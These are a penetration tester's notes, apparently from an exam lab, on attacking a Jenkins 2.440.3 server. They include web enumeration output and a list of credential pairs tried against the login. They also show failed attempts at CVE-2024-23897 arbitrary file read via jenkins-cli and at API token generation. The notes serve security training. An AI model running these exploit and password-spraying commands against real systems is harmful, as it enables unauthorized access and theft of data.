# Whatweb

```zsh
┌──(koshi㉿kali)-[~/Exam/AD/SRV]
└─$ whatweb -v -a3 --log-verbose WebEnum/whatweb_8080.txt http://$TargetIP:8080                     

WhatWeb report for http://172.16.104.202:8080
Status    : 403 Forbidden
Title     : <None>
IP        : 172.16.104.202
Country   : RESERVED, ZZ

Summary   : Cookies[JSESSIONID.45f2994f], HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.45f2994f], Jenkins[2.440.3], Jetty[10.0.20], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]

Detected Plugins:
[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : JSESSIONID.45f2994f

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Jetty(10.0.20) (from server string)

[ HttpOnly ]
        If the HttpOnly flag is included in the HTTP set-cookie 
        response header and the browser supports it then the cookie 
        cannot be accessed through client side script - More Info: 
        http://en.wikipedia.org/wiki/HTTP_cookie 

        String       : JSESSIONID.45f2994f

[ Jenkins ]
        Jenkins is an application that monitors executions of 
        repeated jobs, such as building a software project or jobs 
        run by cron. 

        Version      : 2.440.3
        Google Dorks: (1)
        Website     : http://jenkins-ci.org/

[ Jetty ]
        Jetty is a pure Java application server. Jetty provides an 
        HTTP server, HTTP client, and javax.servlet container. 

        Version      : 10.0.20
        Google Dorks: (1)
        Website     : http://jetty.codehaus.org/jetty/

[ Meta-Refresh-Redirect ]
        Meta refresh tag is a deprecated URL element that can be 
        used to optionally wait x seconds before reloading the 
        current page or loading a new page. More info: 
        https://secure.wikimedia.org/wikipedia/en/wiki/Meta_refresh 

        String       : /login?from=%2F

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


[ UncommonHeaders ]
        Uncommon HTTP server headers. The blacklist includes all 
        the standard headers and many non standard but common ones. 
        Interesting but fairly common headers should have their own 
        plugins, eg. x-powered-by, server and x-aspnet-version. 
        Info about headers can be found at www.http-stats.com 

        String       : x-content-type-options,x-hudson,x-jenkins,x-jenkins-session (from headers)

        X-Hudson: 1.395
        X-Jenkins: 2.440.3
        X-Jenkins-Session: 899b0ecb
        Server: Jetty(10.0.20)

WhatWeb report for http://172.16.104.202:8080/login?from=%2F
Status    : 200 OK
Title     : Sign in [Jenkins]
IP        : 172.16.104.202
Country   : RESERVED, ZZ
```

# Gobuster

errorが多ければ`-t 64`も試す

```zsh
┌──(koshi㉿kali)-[~/Exam/AD/SRV]
└─$ gobuster dir -u http://172.16.104.202:8080/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o WebEnum/gobuster_8080.txt --no-error --exclude-length 666 -s 200,301,302 -b ""
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:               http://172.16.104.202:8080/
[+] Method:            GET
[+] Threads:           100
[+] Wordlist:          /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Status codes:      200,301,302
[+] Exclude Length:    666

/404                  (Status: 200) [Size: 8488]

/_404                 (Status: 200) [Size: 8492]
```

# Enumeration

## index

- JENKINSログイン画面試行認証情報（失敗）
- 入手済みのADユーザー名すべてを使っても失敗
```
admin:admin
administrator:CarHammerChip964
b.martin@oscp.exam:BusyWorkerDay777
b.martin:BusyWorkerDay777
jenkins:BusyWorkerDay777
jenkins:CarHammerChip964
C.ROGERS:CarHammerChip964
C.ROGERS:BusyWorkerDay777
ADMINISTRATOR:BusyWorkerDay777
U.GREGORY:BusyWorkerDay777
U.GREGORY:CarHammerChip964
C.DEAN:CarHammerChip964
C.DEAN:BusyWorkerDay777
O.HUGHES:BusyWorkerDay777
O.HUGHES:CarHammerChip964
P.GETHIN:BusyWorkerDay777
P.GETHIN:CarHammerChip964
T.FUCHS:BusyWorkerDay777
T.FUCHS:CarHammerChip964
B.WILLIAMS
V.SKINNER
G.JARVIS
M.NEWMAN
J.KOLE
S.TUCKER
L.EVGENY
R.ANDREWS
R.GALLAGHER
S.FISCHER
K.FREEMAN
B.CROSS
E.DDWARDS
D.HALL
F.HATFIELD
B.MARTIN
V.PERRY
A.BAILEY
W.BYRD
IUSR:BusyWorkerDay777
IUSR:CarHammerChip964

```

- hydraは、ログインフォームが失敗でも成功でも302が返るので使えない
- Jetty 10.0.20そのものには脆弱性がなさそう

- 以下のURLにアクセスしたら、jenkins-cli.jarを入手
```sh
http://172.16.104.202:8080/jnlpJars/jenkins-cli.jar
```

- robots.txtには特に何もなし

```sh

└─$ java -jar jenkins-cli.jar -s http://172.16.104.202:8080/login?from=%2F -auth b.martin:BusyWorkerDay777 who-am-i

io.jenkins.cli.shaded.jakarta.websocket.DeploymentException: Handshake error.
```

- そのほか以下も試したが失敗
```sh
java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -auth b.martin:BusyWorkerDay777 who-am-i

java -jar jenkins-cli.jar -s http://172.16.104.202:8080/login -auth b.martin:BusyWorkerDay777 who-am-i

java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -auth b.martin@oscp.exam:BusyWorkerDay777 who-am-i

java -jar jenkins-cli.jar -s http://172.16.104.202:8080/login -auth b.martin@oscp.exam:BusyWorkerDay777 who-am-i

java -jar jenkins-cli.jar -s http://172.16.104.202:8080/login?from=%2F -auth b.martin@oscp.exam:BusyWorkerDay777 who-am-i

```

# Arbitrary File Read: CVE-2024-23897の試行 -> 失敗

```powershell
┌──(koshi㉿kali)-[~/Exam/AD/SRV]
└─$ java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -http help "@C:\Windows\win.ini"

ERROR: You must authenticate to access this Jenkins.
Jenkins CLI
```

```zsh
┌──(koshi㉿kali)-[~/Exam/AD/SRV]
└─$ java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ help "@C:\Windows\win.ini"

ERROR: You must authenticate to access this Jenkins.
Jenkins CLI
Usage: java -jar jenkins-cli.jar [-s URL] command [opts...] args...
Options:
 -s URL              : the server URL (defaults to the JENKINS_URL env var)
 -webSocket          : connect using WebSocket (the default; works well with most reverse proxies; requires Jetty)
 -http               : use a pair of HTTP(S) connections rather than WebSocket
 -ssh                : use SSH protocol rather than WebSocket (requires -user; SSH port must be open on server)
 -i KEY              : SSH private key file used for authentication (for use with -ssh)
 -noCertificateCheck : bypass HTTPS certificate check entirely. Use with caution
 -noKeyAuth          : do not try to load the SSH authentication private key. Conflicts with -i
 -user               : specify user (for use with -ssh; must have registered a public key)
 -strictHostKey      : request strict host key checking (for use with -ssh)
 -logger FINE        : enable detailed logging from the client
 -auth [ USER:SECRET | @FILE ] : specify username and either password or API token (or load from them both from a file);
                                 for use with -http.
                                 Passing credentials by file is recommended.
                                 See https://www.jenkins.io/redirect/cli-http-connection-mode for more info and options.
 -bearer [ TOKEN | @FILE ]     : specify authentication using a bearer token (or load the token from file);
                                 for use with -http. Mutually exclusive with -auth.
                                 Passing credentials by file is recommended.

The available commands depend on the server. Run the 'help' command to see the list.
```

```sh
        at io.jenkins.cli.shaded.org.glassfish.tyrus.client.ClientManager$3$1.run(ClientManager.java:658)
```

# APIコード発行

 - 失敗
```sh
┌──(koshi㉿kali)-[~/Exam/AD/SRV]
└─$ curl -X POST \  http://172.16.104.202:8080/user/b.martin/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken \
  --user b.martin:BusyWorkerDay777 \
  -d "newTokenName=tokenA "z
curl: (3) URL rejected: Malformed input to a URL function
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
<title>Error 401 Unauthorized</title>
</head>
<body><h2>HTTP ERROR 401 Unauthorized</h2>
<table>
<tr><th>URI:</th><td>/user/b.martin/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken</td></tr>
<tr><th>STATUS:</th><td>401</td></tr>
<tr><th>MESSAGE:</th><td>Unauthorized</td></tr>
<tr><th>SERVLET:</th><td>Stapler</td></tr>
</table>
<hr/><a href="https://eclipse.org/jetty">Powered by Jetty:// 10.0.20</a><hr/>

</body>
</html>
```
